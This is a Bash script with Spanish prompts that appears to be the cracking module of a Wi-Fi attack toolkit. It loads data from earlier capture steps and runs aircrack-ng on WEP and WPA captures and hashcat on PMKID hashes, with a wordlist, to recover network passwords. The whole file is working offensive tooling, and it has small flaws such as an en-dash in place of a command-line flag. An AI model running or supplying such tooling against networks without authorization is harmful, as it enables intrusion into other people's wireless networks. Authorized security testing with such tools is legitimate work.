#!/bin/bash

# By @m4lal0

# Regular Colors
Black='\033[0;30m'      # Black
Red='\033[0;31m'        # Red
Green='\033[0;32m'      # Green
Yellow='\033[0;33m'     # Yellow
Blue='\033[0;34m'       # Blue
Purple='\033[0;35m'     # Purple
Cyan='\033[0;36m'       # Cyan
White='\033[0;97m'      # White
Color_Off='\033[0m'     # Text Reset

# Additional colors
LGray='\033[0;37m'      # Ligth Gray
DGray='\033[0;90m'      # Dark Gray
LRed='\033[0;91m'       # Ligth Red
LGreen='\033[0;92m'     # Ligth Green
LYellow='\033[0;93m'    # Ligth Yellow
LBlue='\033[0;94m'      # Ligth Blue
LPurple='\033[0;95m'    # Light Purple
LCyan='\033[0;96m'      # Ligth Cyan

# Bold
BBlack='\033[1;30m'     # Black
BGray='\033[1;37m'		# Gray
BRed='\033[1;31m'       # Red
BGreen='\033[1;32m'     # Green
BYellow='\033[1;33m'    # Yellow
BBlue='\033[1;34m'      # Blue
BPurple='\033[1;35m'    # Purple
BCyan='\033[1;36m'      # Cyan
BWhite='\033[1;37m'     # White

# Underline
UBlack='\033[4;30m'     # Black
UGray='\033[4;37m'		# Gray
URed='\033[4;31m'       # Red
UGreen='\033[4;32m'     # Green
UYellow='\033[4;33m'    # Yellow
UBlue='\033[4;34m'      # Blue
UPurple='\033[4;35m'    # Purple
UCyan='\033[4;36m'      # Cyan

# Background
On_Black='\033[40m'     # Black
On_Red='\033[41m'       # Red
On_Green='\033[42m'     # Green
On_Yellow='\033[43m'    # Yellow
On_Blue='\033[44m'      # Blue
On_Purple='\033[45m'    # Purple
On_Cyan='\033[46m'      # Cyan
On_White='\033[47m'     # White

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Debes cerrar la ventana completa de Terminator.${Color_Off}\n"
    main
}

function question(){
    input=""
    while [ "$input" == "" ]; do
        echo -en "${LBlue}[${BPurple}?${LBlue}] ${BGray}$1: ${Color_Off}" && read input
    done
}

function readParameters(){
	test -f .attack.txt
	if [ "$(echo $?)" != "0" ];then
        clear
        echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}En espera que realice el ataque primero...${Color_Off}\n"
		echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}cuando lo hayas realizado.${Color_Off}" && read
		readParameters
	else
        INTERFACE=$(cat .interface.txt)
        ESSID=$(cat .output.txt)
        BSSID=$(cat output/$ESSID/.target.txt | grep "BSSID" | cut -d '|' -f 2)
        CHANNEL=$(cat output/$ESSID/.target.txt | grep "CHANNEL" | cut -d '|' -f 2)
        MAC=$(macchanger -s $INTERFACE | grep "Current" | xargs | cut -d ' ' -f 3)
		TYPE_ATTACK=$(cat .attack.txt | grep Attack | cut -d '|' -f2)
        NAME_ATTACK=$(cat .attack.txt | grep Attack | cut -d '|' -f3)
        CAP_FILE="output/$ESSID/$ESSID-01.cap"
        WORDLIST=wordlists/passwords.txt
	fi
}

function crackingWepFake(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Se ha detectado que ha realizado un ataque $TYPE_ATTACK - $NAME_ATTACK...${Color_Off}\n"
	echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}para ejecutar el cracking.${Color_Off}" && read
	aircrack-ng –b $BSSID $CAP_FILE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function crackingWepARP(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Se ha detectado que ha realizado un ataque $TYPE_ATTACK - $NAME_ATTACK...${Color_Off}\n"
	echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}para ejecutar el cracking.${Color_Off}" && read
	aircrack-ng –b $BSSID $CAP_FILE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function crackingWpaHandshake(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Se ha detectado que ha realizado un ataque $TYPE_ATTACK - $NAME_ATTACK...${Color_Off}\n"
	echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}para ejecutar el cracking.${Color_Off}" && read
    aircrack-ng -w $WORDLIST $CAP_FILE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function crackingWpaDosMode(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Se ha detectado que ha realizado un ataque $TYPE_ATTACK - $NAME_ATTACK...${Color_Off}\n"
	echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}para ejecutar el cracking.${Color_Off}" && read
    aircrack-ng -w $WORDLIST $CAP_FILE
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function crackingWpaPKMID(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Se ha detectado que ha realizado un ataque $TYPE_ATTACK - $NAME_ATTACK...${Color_Off}\n"
	echo -en "${BGray}Presiona ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}para ejecutar el cracking.${Color_Off}" && read
    hcxpcaptool -z myHashes PKMID && rm PKMID 2>/dev/null
    hashcat -m 16800 $WORDLIST myHashes -d 1 --force
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${LBlue}[${BGreen}✔${LBlue}] ${BGreen}Ejecutado correctamente${Color_Off}"
        echo -en "\n${BGray}Presione ${On_Black}${BGreen}[ENTER]${Color_Off} ${BGray}Para regresar.${Color_Off}" && read
        main
    else
        echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Algo salió mal.${Color_Off}"
        sleep 2
        main
    fi
}

function veryCracking(){
    clear
    if [ "$TYPE_ATTACK" == "WEP" ] && [ "$NAME_ATTACK" == "Fake-Authentication" ];then
        echo -e "\n\t\t${BBlue}CRACKING PASSWORD ${BGreen}WEP - Fake-Authentication${Color_Off}"
		crackingWepFake
    elif [ "$TYPE_ATTACK" == "WEP" ] && [ "$NAME_ATTACK" == "ARP-Replay" ];then
        echo -e "\n\t\t${BBlue}CRACKING PASSWORD ${BGreen}WEP - ARP-Repla${Color_Off}"
		crackingWepARP
    elif [ "$TYPE_ATTACK" == "WPA" ] && [ "$NAME_ATTACK" == "Handshake" ];then
        echo -e "\n\t\t${BBlue}CRACKING PASSWORD ${BGreen}WAP / WAP2 - Handshake${Color_Off}"
		crackingWpaHandshake
    elif [ "$TYPE_ATTACK" == "WPA" ] && [ "$NAME_ATTACK" == "Dos-Mode" ];then
        echo -e "\n\t\t${BBlue}CRACKING PASSWORD ${BGreen}WAP / WAP2 - Authentication DoS Mode${Color_Off}"
		crackingWpaDosMode
    elif [ "$TYPE_ATTACK" == "WPA" ] && [ "$NAME_ATTACK" == "PKMID" ];then
        echo -e "\n\t\t${BBlue}CRACKING PASSWORD ${BGreen}WAP / WAP2 - PKMID${Color_Off}"
		crackingWpaPKMID
    else
        main
	fi
}

function main(){
    readParameters
    veryCracking
}

main